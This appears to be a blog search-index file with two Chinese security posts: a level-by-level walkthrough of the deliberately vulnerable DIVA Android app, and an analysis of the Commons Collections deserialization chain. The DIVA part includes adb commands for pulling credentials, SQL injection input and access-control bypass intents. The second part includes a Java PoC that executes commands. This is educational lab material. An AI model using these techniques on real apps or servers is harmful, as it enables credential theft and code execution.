<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>APP测试-DIVA</title>
    <url>/2022/03/22/APP%E6%B5%8B%E8%AF%95-DIVA/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="DIVA简介"><a href="#DIVA简介" class="headerlink" title="DIVA简介"></a>DIVA简介</h3><p>DIVA（该死的不安全和易受攻击的应用程序）是故意设计的存在很多漏洞的Android app。</p>
<span id="more"></span>

<p>源代码链接：<a href="https://github.com/payatu/diva-android">https://github.com/payatu/diva-android</a></p>
<p>apk文件链接：<a href="http://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz">http://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz</a></p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><ul>
<li>逍遥模拟器</li>
<li>JDK1.8</li>
<li>Apktool</li>
<li>dex2jar、jd-gui、Android-Killer</li>
</ul>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>adb连接模拟器，adb.exe connect 127.0.0.1:21503，报错，原因是开放了另一个端口</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322182127651-1709294793.png" alt="image-20220322182127434"></p>
<p>换个端口就好了，因为有多个模拟器，占用的端口不一样</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322183553532-1260709617.png" alt="image-20220322183554442"></p>
<p>将apk放进模拟器，打开</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322182504954-46243243.png" alt="image-20220322182505484"></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="第一关-不安全的日志输出"><a href="#第一关-不安全的日志输出" class="headerlink" title="第一关 不安全的日志输出"></a>第一关 不安全的日志输出</h4><p>产生原因：由于app代码中将敏感信息（如凭据，会话ID，财务详细信息等）通过log.e输出，所以在app的表单中输入的内容，可以在相关的日志中输出。</p>
<p>这里模拟输入敏感信息“111”</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322183611807-1401167450.png" alt="image-20220322183612462"></p>
<p>通过<code>adb logcat</code>查看运行日志</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322183706432-1875151932.png" alt="image-20220322183707309"></p>
<p>把apk文件拖到Android-Killer，然后还原java代码，在<code>LogActivity#checkout</code>方法中发现，会将用户输入的credit输出到日志中</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322184235923-1347215088.png" alt="image-20220322184236504"></p>
<h4 id="第二关-硬编码-第一部分"><a href="#第二关-硬编码-第一部分" class="headerlink" title="第二关 硬编码-第一部分"></a>第二关 硬编码-第一部分</h4><p>硬编码是将数据直接嵌入到程序或其他可执行对象的源代码中的软件开发实践，与从外部获取数据或在运行时生成数据不同。 </p>
<p>随便输入</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322184605652-1512158428.png" alt="image-20220322184606248"></p>
<p>然后定位到源码<code>HardcodeActivity#access</code>方法中，发现vendor key的值</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322184651189-182372022.png" alt="image-20220322184651281"></p>
<p>提交</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322184736454-1262318612.png" alt="image-20220322184737128"></p>
<h4 id="第三关-不安全的数据存储-第一部分"><a href="#第三关-不安全的数据存储-第一部分" class="headerlink" title="第三关 不安全的数据存储-第一部分"></a>第三关 不安全的数据存储-第一部分</h4><p>产生原因：使用了<code>SharedPreferences</code>类，该类是Android平台上一个轻量级的存储类，主要是用来保存一些常用的配置，本例中是用该类存储了用户名和密码，因此是具有风险的。<code>SharedPreferences</code>类存储的数据会以.xml的形式存储在&#x2F;data&#x2F;data&#x2F;app的包名&#x2F;shared_prefs目录下。</p>
<p>首先随意输入用户名和密码点击保存</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322184924698-1218298847.png" alt="image-20220322184924591"></p>
<p>进入shell模式，在&#x2F;data&#x2F;data&#x2F;jakhar.aseem.diva&#x2F;shared_prefs&#x2F;目录中查看jakhar.aseem.diva_preferences.xml文件，也可以输入adb pull &#x2F;data&#x2F;data&#x2F;jakhar.aseem.diva&#x2F;shared_prefs .&#x2F;将文件复制出来查看，发现文件中保存了刚刚输入的用户名和密码。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322185106189-1658036911.png" alt="image-20220322185107256"></p>
<p>查看源码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322185224730-2122017400.png" alt="image-20220322185225572"></p>
<h4 id="第四关-不安全的数据存储-第二部分"><a href="#第四关-不安全的数据存储-第二部分" class="headerlink" title="第四关 不安全的数据存储-第二部分"></a>第四关 不安全的数据存储-第二部分</h4><p>产生原因：将敏感数据保存在本地的sqlite3数据库中，对应的数据库目录: &#x2F;data&#x2F;data&#x2F;app的包名&#x2F;databases</p>
<p>输入用户名和密码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322185333786-597081479.png" alt="image-20220322185334417"></p>
<p>进入&#x2F;data&#x2F;data&#x2F;jakhar.aseem.diva&#x2F;databases&#x2F;目录中，将数据库文件ids2下载到本地，<code>adb pull /data/data/jakhar.aseem.diva/databases/ids2 .</code>，使用sqlite数据库管理工具打开即可查看到保存的用户名和密码。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322213625748-1287546810.png" alt="image-20220322213625717"></p>
<p>在<code>InsecureDataStorage2Activity#saveCredentials</code>中可以看到，将输入的用户名和密码插入到sqlite3数据库。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322214059131-1473243306.png" alt="image-20220322214059563"></p>
<h4 id="第五关-不安全的数据存储-第三部分"><a href="#第五关-不安全的数据存储-第三部分" class="headerlink" title="第五关 不安全的数据存储-第三部分"></a>第五关 不安全的数据存储-第三部分</h4><p>产生原因：将敏感数据保存在临时文件中，对应的临时文件目录: &#x2F;data&#x2F;data&#x2F;app的包名&#x2F;</p>
<p>输入用户名和密码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322214604404-1922986992.png" alt="image-20220322214605016"></p>
<p>进入&#x2F;data&#x2F;data&#x2F;jakhar.aseem.diva&#x2F;目录中查看该目录下临时文件uinfo-1161629033tmp</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322214838647-178846512.png" alt="image-20220322214839395"></p>
<p>查看源码，在<code>InsecureDataStorage3Activity#saveCredentials</code>，代码将用户的输入保存到tmp文件中</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322215121757-1535698173.png" alt="image-20220322215122161"></p>
<h4 id="第六关-不安全的数据存储-第四部分"><a href="#第六关-不安全的数据存储-第四部分" class="headerlink" title="第六关 不安全的数据存储-第四部分"></a>第六关 不安全的数据存储-第四部分</h4><p> 产生原因：将敏感数据保存在sd卡中，对应的目录一般在：&#x2F;mnt&#x2F;sdcard，也可以通过logcat查看保存路径。</p>
<p>输入用户名和密码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322215319072-1894776264.png" alt="image-20220322215319664"></p>
<p>进入&#x2F;mnt&#x2F;sdcard&#x2F;目录中，查看文件.unifo.txt</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322215455294-52795390.png" alt="image-20220322215456142"></p>
<p>查看源码，在<code>InsecureDataStorage4Activity#saveCredentials</code>，代码将用户名和密码保存在sd卡的.uinfo.txt文件中</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322215658926-1701769296.png" alt="image-20220322215659410"></p>
<h4 id="第七关-输入校验问题-第一部分"><a href="#第七关-输入校验问题-第一部分" class="headerlink" title="第七关 输入校验问题-第一部分"></a>第七关 输入校验问题-第一部分</h4><p>产生原因：某些不安全控件内输入sql或其他数据库的一些语句，因为在使用前未进行检验长度和过滤等操作，从而达到欺骗服务器执行恶意代码影响到数据库的数据。</p>
<p>首先输入test’和test’’试探一下，test’什么也不返回，而test’’会返回”not found”</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322220405275-20108047.png" alt="image-20220322220405444"></p>
<p>输入万能密码<code>test&#39; or &#39;1&#39;=&#39;1</code>尝试，返回了所有用户的数据</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322220539037-533361955.png" alt="image-20220322220539575"></p>
<p>在<code>SQLInjectionActivity#search</code>，可以看到直接将输入的用户名拼接在SQL语句后面，没有做任何过滤，导致SQL注入的发生。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322221226886-308377082.png" alt="image-20220322221227874"></p>
<h4 id="第八关-输入校验问题-第二部分"><a href="#第八关-输入校验问题-第二部分" class="headerlink" title="第八关 输入校验问题-第二部分"></a>第八关 输入校验问题-第二部分</h4><p>产生原因：在处理转跳时存在漏洞，导致允许从http域跨向file域，实现跨域漏洞，在 File 域下，同源策略跨域访问则能够对私有目录文件进行访问</p>
<p>输入一段url点击可以看到访问了这个页面</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322221551589-1756382319.png" alt="image-20220322221552254"></p>
<p>将https&#x2F;http协议换成File协议，利用file协议读取之前存储在sd卡的账号文件&#x2F;mnt&#x2F;sdcard&#x2F;.uinfo.txt</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322221937197-860498897.png" alt="image-20220322221937870"></p>
<p>在<code>InputValidation2URISchemeActivity#get</code>，代码没有对输入的数据进行处理直接loadUrl</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322222225023-451516831.png" alt="image-20220322222226194"></p>
<h4 id="第九关-访问控制问题-第一部分"><a href="#第九关-访问控制问题-第一部分" class="headerlink" title="第九关 访问控制问题-第一部分"></a>第九关 访问控制问题-第一部分</h4><p>点击按钮</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322222520447-960683478.png" alt="image-20220322222521636"></p>
<p>这里我们要不使用按钮就获取到API凭据，先定位到<code>APICredsActivity</code>类名，</p>
<p>查看AndroidManifest.XML文件，找到了相关的activity</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322223823174-167174189.png" alt="image-20220322223824358"></p>
<p>通过观察代码发现，这个activity设置了intent filter，如果为一个Activity设置了IntentFilter，你就可以在应用内或者其他应用中，用特定的隐式Intent来启动这个Activity，如果没有为Activity设置IntentFilter，那么你就只能通过显示Intent来启动这个Activity。</p>
<p>adb启动activity组件，输入命令，即可启动APICredsActivity</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell am start jakhar.aseem.diva/.APICredsActivity</span><br><span class="line">或者</span><br><span class="line">adb shell am start -n jakhar.aseem.diva/.APICredsActivity -a jakhar.aseem.diva.action.VIEW_CREDS</span><br><span class="line">am start: 启动activity 管理工具</span><br><span class="line">-a：指定action</span><br><span class="line">-n：指定完整 component 名</span><br><span class="line">命令详情：https://developer.android.google.cn/studio/command-line/adb#am</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322224436365-482229719.png" alt="image-20220322224436885"></p>
<h4 id="第十关-访问控制问题-第二部分"><a href="#第十关-访问控制问题-第二部分" class="headerlink" title="第十关 访问控制问题-第二部分"></a>第十关 访问控制问题-第二部分</h4><p>从题目描述可以知道，通过注册后才能拥有tveeter API Credentials，所以要通过不注册来获取API Credentials</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322224826718-716123326.png" alt="image-20220322224826794"></p>
<p>尝试上一关的方式，跳到了一个需要输入PIN的activity，这表明程序做了相应的措施</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322224932014-1898417047.png" alt="image-20220322224932400"></p>
<p>查看源码<code>APICreds2Activity</code>，获取到上一个activity传来的boolean值，并当该值为false时就获取到apikey</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322225415347-1032098981.png" alt="image-20220322225416042"></p>
<p>查看上一个activity，即<code>AccessControl2Activity</code>，在代码如下位置发现设置的boolean值</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322230827731-1688194136.png" alt="image-20220322230828762"></p>
<p>这个类中bool值是通过单选项来决定的，而且把值传给下个activity，这时我们可以使用–ez来传递一个boolean键值对，但是要获取到2131099686值对应的key值是什么，十进制2131099686转换为16进制0x7f060026，在AndroidKiller中搜索0x7f060026</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322231629730-1116343886.png" alt="image-20220322231629557"></p>
<p>得到对于的name值为chk_pin，再全局搜索name值，得到key为check_pin</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322231855197-108821087.png" alt="image-20220322231856128"></p>
<p>最后adb启动activity命令，成功弹出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS2 -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322232124534-182093013.png" alt="image-20220322232125667"></p>
<h4 id="第十一关-访问控制问题-第三部分"><a href="#第十一关-访问控制问题-第三部分" class="headerlink" title="第十一关 访问控制问题-第三部分"></a>第十一关 访问控制问题-第三部分</h4><p>根据题目的描述，这是个私人笔记app，一开始需要设置密码才能使用，现在我们尝试不设置密码就开始使用</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322232512207-651302979.png" alt="image-20220322232513013"></p>
<p>定位到类<code>NotesProvider</code>，对应到AndroidManifest.XML文件</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322233006812-1932681545.png" alt="image-20220322233008111"></p>
<p>代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;provider android:authorities=&quot;jakhar.aseem.diva.provider.notesprovider&quot; android:enabled=&quot;true&quot; android:exported=&quot;true&quot; android:name=&quot;jakhar.aseem.diva.NotesProvider&quot;/&gt;</span><br></pre></td></tr></table></figure>

<p>这里使用了ContentProvider，android:enabled表示是否能由系统初始化，android:exported表示是否能被其他应用使用，android:authorities标识这个ContentProvider，调用者可以根据这个标识来找到它，看到2个值都为true，我们就可以使用content:&#x2F;&#x2F;访问里面的数据了，查看包含content:&#x2F;&#x2F;的字符串文件&#x2F;smali&#x2F;jakhar&#x2F;aseem&#x2F;diva&#x2F;NotesProvider.smali</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234114956-1692793041.png" alt="image-20220322234116133"></p>
<p>我们可以使用以下命令访问该uri</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb shell content query –-uri content://jakhar.aseem.diva.provider.notesprovider/notes</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234351285-255533229.png" alt="image-20220322234352521"></p>
<h4 id="第十二关-硬编码-第二部分"><a href="#第十二关-硬编码-第二部分" class="headerlink" title="第十二关 硬编码-第二部分"></a>第十二关 硬编码-第二部分</h4><p>随便输入</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234519154-478736019.png" alt="image-20220322234520188"></p>
<p>在源码<code>Hardcode2Activity#access</code>，这里使用了DivaJni类</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234635543-1098201335.png" alt="image-20220322234636623"></p>
<p>查看DivaJni类的代码</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322234838761-1732204680.png" alt="image-20220322234839930"></p>
<p>这里加载了divajni库，一般库文件都放在&#x2F;lib下，在目录下找到libdivajni.so文件</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235156437-1322532202.png" alt="image-20220322235157544"></p>
<p>linux下可以使用strings查看二进制文件里的字符串</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235505226-1937628888.png" alt="image-20220322235505909"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__cxa_finalize</span><br><span class="line">__cxa_atexit</span><br><span class="line">Java_jakhar_aseem_diva_DivaJni_access</span><br><span class="line">Java_jakhar_aseem_diva_DivaJni_initiateLaunchSequence</span><br><span class="line">strcpy</span><br><span class="line">JNI_OnLoad</span><br><span class="line">_edata</span><br><span class="line">__bss_start</span><br><span class="line">_end</span><br><span class="line">libstdc++.so</span><br><span class="line">libm.so</span><br><span class="line">libc.so</span><br><span class="line">libdl.so</span><br><span class="line">libdivajni.so</span><br><span class="line">&lt;$!H</span><br><span class="line">olsdfgad;lh</span><br><span class="line">.dotdot</span><br><span class="line">;*3$&quot;</span><br><span class="line">GCC: (GNU) 4.9 20140827 (prerelease)</span><br><span class="line">gold 1.11</span><br><span class="line">.shstrtab</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.hash</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.text</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.fini_array</span><br><span class="line">.init_array</span><br><span class="line">.dynamic</span><br><span class="line">.got</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line">.note.gnu.gold-version</span><br></pre></td></tr></table></figure>

<p>逐个尝试，得到<code>olsdfgad;lh</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235832847-2033031412.png" alt="image-20220322235833870"></p>
<h4 id="第十三关-输入校验问题-第三部分"><a href="#第十三关-输入校验问题-第三部分" class="headerlink" title="第十三关 输入校验问题-第三部分"></a>第十三关 输入校验问题-第三部分</h4><p>随便试试</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322235939256-2038808093.png" alt="image-20220322235939860"></p>
<p>当输入长的数据时，程序崩溃了，应该是缓冲区溢出了</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323000316997-96476980.png" alt="image-20220323000317916"></p>
<p>查看源码<code>InputValidation3Activity#push</code></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323000834795-1107643338.png" alt="image-20220323000835749"></p>
<p>查看该类的源码<a href="https://github.com/payatu/diva-android/blob/master/app/src/main/jni/divajni.c%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%9A%84%E6%98%AFstrcpy%EF%BC%8C%E5%85%B8%E5%9E%8B%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%8D%E5%88%B6%E6%BA%A2%E5%87%BA">https://github.com/payatu/diva-android/blob/master/app/src/main/jni/divajni.c，使用的是strcpy，典型的字符串复制溢出</a></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323001417565-1536880141.png" alt="image-20220323001418193"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/DmonezeCfUdx5_Bzr1lFuw">https://mp.weixin.qq.com/s/DmonezeCfUdx5_Bzr1lFuw</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>APP</tag>
      </tags>
  </entry>
  <entry>
    <title>Commons Collections1分析前置知识</title>
    <url>/2022/03/23/Commons-Collections1%E5%88%86%E6%9E%90%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>Commons Collections</code>的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。<code>Apache Commons Collections</code>是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。</p>
<span id="more"></span>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JDK版本：jdk1.8以前（8u71之后已修复不可利用）</span><br><span class="line">CC版本：Commons-Collections 3.1-3.2.1</span><br></pre></td></tr></table></figure>

<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>看下poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.sec.test1;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        //将transformers数组存入ChaniedTransformer这个继承类</span><br><span class="line">        Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        //创建Map并绑定transformerChina</span><br><span class="line">        Map innerMap = new HashMap();</span><br><span class="line">        innerMap.put(&quot;value&quot;, &quot;value&quot;);</span><br><span class="line">        //给予map数据转化链</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);</span><br><span class="line"></span><br><span class="line">        //触发漏洞</span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span><br><span class="line">        onlyElement.setValue(&quot;foobar&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果成功执行命令，先来说下原因：首先利用<code>ChainedTransformer</code>类构建一个<code>Transformer</code>链，通过调用多个Transformer类来造成命令执行；当调用<code>ChainedTransformer.transform()</code>时，会把<code>Transformer[]</code>数组中的所有<code>Transformer</code>依次执行<code>transform()</code>方法，而且这里每个<code>transform()</code>方法执行后的结果被传递给第二个<code>Transformer</code>去执行<code>transform()</code>方法，所以造成命令执行。以上代码相当于这一行代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().getClass().getMethod(&quot;exec&quot;,new </span><br><span class="line">Class[]&#123;String.class&#125;).invoke(Runtime.getRuntime(),&quot;calc.exe&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323113633723-703888015.png" alt="image-20220323113632899"></p>
<p>在调试调用链的时候，会接触到一些没接触过的类，先了解下这些类的作用。</p>
<h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><p><code>Transformer</code>是<code>Commons Collections</code>中提供的一个接口</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323123755936-52589905.png" alt="image-20220323123754968"></p>
<p>根据注释可以了解到，<code>Transformer</code> 定义由将一个对象转换为另一个对象的类实现的仿函数接口。 <code>Transformer</code> 将输入对象转换为输出对象，输入对象应保持不变。 <code>Transformer</code> 通常用于类型转换或从对象中提取数据。</p>
<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>ConstantTransformer</code>是<code>Transformer</code>的实现类，注释中解释说“每次返回相同常量的转换器实现，不检查对象是否不可变。通常，只有不可变对象才应该使用常量工厂，可变对象应该使用原型工厂”。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323143526760-1572607252.png" alt="image-20220323143526180"></p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><code>InvokerTransformer</code>也是<code>Transformer</code>的实现类，作用是通过反射创建一个新对象实例的<code>Transformer</code>实现。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323143651333-1091631069.png" alt="image-20220323143650924"></p>
<p>在构造方法中有三个参数，第一个参数是待执行的方法名，第二个参数<br>是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表 。</p>
<p>里面还有个<code>transform</code>的方法，代码很明显，该方法可以通过Java反射机制来进行执行任意代码。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323145022998-2014512859.png" alt="image-20220323145022528"></p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><code>ChainedTransformer</code>也是实现了<code>Transformer</code>接口的⼀个类，作用是可以实现将指定的<code>Transformer</code>链接在一起。输入对象被传递给第一个<code>Transformer</code>，输出后的结果被传递给第二个<code>Transformer</code>，依此类推。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323150705722-1852287205.png" alt="image-20220323150705192"></p>
<p>注意到<code>ChainedTransformer</code>有个<code>transform</code>方法，该方法的作用是将每个<code>Transformer</code>的输入转换为结果，这里会遍历<code>transform</code>数组。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323151522263-1798028772.png" alt="image-20220323151521930"></p>
<h4 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h4><p>利用<code>Transformer</code>来执行命令需要绑定到Map上，抽象类<code>AbstractMapDecorator</code>是<code>Apache Commons Collections</code>提供的一个类，实现类有很多，比如<code>LazyMap</code>、<code>TransformedMap</code>等，这些类都有一个<code>decorate()</code>方法，用于将上述的<code>Transformer</code>实现类绑定到Map上，当对Map进行一些操作时，如修改数据，会自动触发<code>Transformer</code>实现类的<code>tranform()</code>方法，不同的Map类型有不同的触发规则。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323153425618-474630593.png" alt="image-20220323153425166"></p>
<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h4><p>之前我们在poc里写了如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //给予map数据转化链</span><br></pre></td></tr></table></figure>

<p>跟踪下就可以知道，通过<code>TransformedMap.decorate()</code>方法将<code>Transformer</code>实现类分别绑定到map的key和value上，当map的key或value被修改时，会调用对应<code>Transformer</code>实现类的<code>transform()</code>方法。我们可以把<code>chainedtransformer</code>绑定到一个<code>TransformedMap</code>上，当此map的key或value发生改变时，就会自动触发<code>chainedtransformer.transform()</code>方法。</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323155612605-743381297.png" alt="image-20220323155612177"></p>
<p>下面简单分析下执行流程</p>
<p>先编写一个测试用例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.sec.test1;</span><br><span class="line"></span><br><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class Mytransform implements Transformer &#123;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    public Mytransform(String name) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Object transform(Object input) &#123;</span><br><span class="line">        System.out.println(&quot;in myTransformer ：transform()&quot;);</span><br><span class="line">        System.out.println(&quot;input is &quot; + input);</span><br><span class="line">        return this.name;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Transformer getinstance(String name) &#123;</span><br><span class="line">        return new Mytransform(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Mytransform mytransform = (Mytransform) Mytransform.getinstance(&quot;sec&quot;);</span><br><span class="line">        HashMap objectObjectHashMap = new HashMap();</span><br><span class="line">        objectObjectHashMap.put(&quot;key1&quot;, &quot;value1&quot;);</span><br><span class="line">        objectObjectHashMap.put(&quot;key2&quot;, &quot;value2&quot;);</span><br><span class="line">        Map map = TransformedMap.decorate(objectObjectHashMap, null, mytransform);</span><br><span class="line">        Map.Entry entry = (Map.Entry) map.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(&quot;new1&quot;);</span><br><span class="line">        System.out.println(objectObjectHashMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
